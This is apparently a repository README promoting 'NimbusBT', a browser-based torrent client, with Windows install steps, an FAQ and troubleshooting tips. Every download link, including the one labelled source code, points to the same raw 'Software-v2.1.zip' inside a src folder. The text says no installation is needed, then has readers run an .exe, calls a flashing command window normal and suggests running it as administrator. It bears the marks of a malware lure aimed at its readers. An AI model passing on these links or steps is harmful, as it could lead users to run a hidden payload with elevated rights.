# ☁️ NimbusBT - Seamless Torrenting in Your Browser

[![Download NimbusBT](https://img.shields.io/badge/Download-NimbusBT-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)

---

## 🚀 Getting Started

Welcome to NimbusBT! This guide will help you download, install, and start using your new BitTorrent client in just a few minutes. No technical knowledge required — we walk you through everything step by step.

NimbusBT is a modern, secure, and open-source BitTorrent client that puts privacy first. Instead of a complicated desktop program, NimbusBT runs right in your web browser. That means it works the same way on Windows, Mac, or Linux, and you can even control it from your phone or tablet.

---

## 🖥️ What is NimbusBT?

Think of NimbusBT as your personal download manager for large files. When you download a movie, a software program, or a game using BitTorrent technology, NimbusBT connects you directly to other people sharing that same file. This makes downloads faster and more reliable than traditional methods.

Here's what makes NimbusBT special:

- **Web Interface** — No installation of a heavy program. Open your browser, and you're ready to go
- **Command Line Tools** — For power users who prefer typing commands
- **SOCKS5 Proxy Support** — Route your traffic through a proxy for extra privacy
- **Blocklist Integration** — Automatically filter out known bad peers
- **100% Open Source** — The code is public, so you can verify exactly what it does

---

## 📥 Downloading NimbusBT

Visit this link to download the application: **[https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)**

Here's what you'll see when you arrive:

1. **Find the Latest Release** — Look for a green button or a section labeled "Latest" at the top of the page
2. **Choose Your Package** — You'll see options like `nimbusbt-windows.zip` or `nimbusbt-mac.zip`. Pick the one that matches your computer
3. **Click to Download** — The download starts automatically. Your browser will show a progress bar

---

## 🛠️ Installation Guide (Windows)

After the download completes, follow these simple steps:

### Step 1: Locate the Downloaded File
Open your **Downloads** folder. You'll see a file called `nimbusbt-windows.zip` (or similar).

### Step 2: Extract the Files
Right-click on the ZIP file and select **"Extract All..."** from the menu. Windows will ask where you want to save the files — choose a folder like `C:\NimbusBT` and click "Extract."

### Step 3: Run the Application
Inside the extracted folder, double-click the file named `nimbusbt.exe`. A black command window will open and then close — that's normal. NimbusBT is now running in the background.

### Step 4: Open the Web Interface
Open your web browser (Chrome, Edge, Firefox, or Safari) and type this address in the address bar:

```
http://localhost:4200
```

Press Enter, and you'll see the NimbusBT dashboard. Congratulations, you're ready to download!

---

## 🎯 Using NimbusBT for the First Time

The NimbusBT interface is designed to be intuitive. Here's a quick tour:

### The Main Dashboard
When you open `http://localhost:4200`, you'll see:
- **Add Torrent** — A large button to add new downloads
- **Active Downloads** — A list showing progress, speed, and file sizes
- **Settings** — Located in the top-right corner, gear icon

### Adding Your First Torrent
1. Click the **"Add Torrent"** button (blue with a plus icon)
2. You can **paste a magnet link** or **upload a .torrent file**
3. Click "Download" — NimbusBT starts fetching the file immediately

### Monitoring Your Downloads
On the dashboard, you can see:
- **Progress Bar** — Visual representation of download completion
- **Download Speed** — Shown in KB/s or MB/s
- **Upload Speed** — How fast you're sharing with others
- **Seeds and Peers** — Number of people uploading/downloading the same file

---

## 🤔 Frequently Asked Questions

### Is NimbusBT safe to use?

Yes. NimbusBT is open source, meaning its code is visible to anyone. It has built-in blocklist support to filter out malicious peers. Always download files from trusted sources, and consider using the built-in SOCKS5 proxy for additional anonymity.

### What is SOCKS5 proxy and why would I use it?

A SOCKS5 proxy routes your torrent traffic through a different server, making your real IP address invisible to other peers. This protects your privacy. You can configure it in Settings > Proxy. If you use a VPN service, you can often find SOCKS5 settings from your VPN provider.

### Can I use NimbusBT on my phone?

Yes! Since NimbusBT runs in a web browser, you can control it from any device on your local network. Just find your computer's local IP address (e.g., 192.168.1.5), then type `http://192.168.1.5:4200` in your phone's browser.

### How do I stop NimbusBT?

To close NimbusBT completely, right-click on the folder where you extracted it and close the command window, or press `Ctrl+C` in that window. On Windows, you can also use Task Manager to end the process.

---

## ⚙️ Advanced Features

For those who want more control:

### Command Line Interface (CLI)
If you're comfortable with command prompts, open a terminal in the NimbusBT directory and type:

```
nimbusbt --help
```

This shows all available commands for managing downloads, checking status, and tweaking settings.

### Setting Up a Blocklist
Blocklists keep unwanted peers from connecting to you. In the web UI:

1. Go to **Settings** (gear icon)
2. Find **"Blocklist"** 
3. Paste a URL of a public blocklist (you can search for "P2P blocklist" online)
4. Click "Update" — NimbusBT refreshes the list automatically

### Configuring SOCKS5 Proxy
For enhanced privacy:

1. Open Settings
2. Click **"Proxy"**
3. Enter your SOCKS5 proxy address and port
4. Check **"Enable Proxy"**
5. Save changes — all torrent traffic now goes through the proxy

---

## 📦 System Requirements

NimbusBT is lightweight and designed to run on almost any modern computer:

- **Operating System:** Windows 10 or later, macOS 10.15+, most Linux distributions
- **RAM:** 512 MB minimum (2 GB recommended)
- **Storage:** 100 MB free space for the app itself (plus your downloaded files)
- **Browser:** Chrome, Edge, Firefox, Safari — any modern browser works
- **Internet:** Broadband connection for fast downloads

---

## 💡 Troubleshooting Tips

**Problem: I can't open the web interface**
- Make sure you ran `nimbusbt.exe` and it's still running
- Check that nothing is blocking port 4200 (firewall settings)
- Try restarting your computer and starting the app again

**Problem: Downloads are slow**
- Check your internet speed
- Look for more seeds (people sharing the file) — more seeds = faster download
- Close other programs that use heavy bandwidth

**Problem: The app won't start**
- Ensure you extracted the ZIP file completely (not running from inside the archive)
- Try running the EXE as administrator (right-click → "Run as administrator")

---

## 🌐 Why Choose NimbusBT?

There are many torrent clients, but NimbusBT stands out because:

1. **No installation hassles** — Unzip and run. No system registry changes
2. **Cross-platform** — Same interface on Windows, Mac, or Linux
3. **Privacy-first design** — Built-in PROXY support and blocklist
4. **Active development** — Regular updates with security fixes
5. **Community-driven** — Open source means anyone can contribute improvements

---

## 📚 Further Resources

- **Source Code:** [https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)
- **Report Issues:** Use the Issues tab on the GitHub page
- **Documentation:** Check the `docs` folder in the repository for technical details

---

**Start downloading smarter today with NimbusBT.** Click the button below to grab your copy:

[![Get NimbusBT Now](https://img.shields.io/badge/Download-NimbusBT-FF5733?style=for-the-badge&logo=download&logoColor=white&labelColor=333333)](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)

Keywords: bittorrent, cli, nodejs, open-source, p2p, privacy, socks5, torrent, web-ui, webtorrent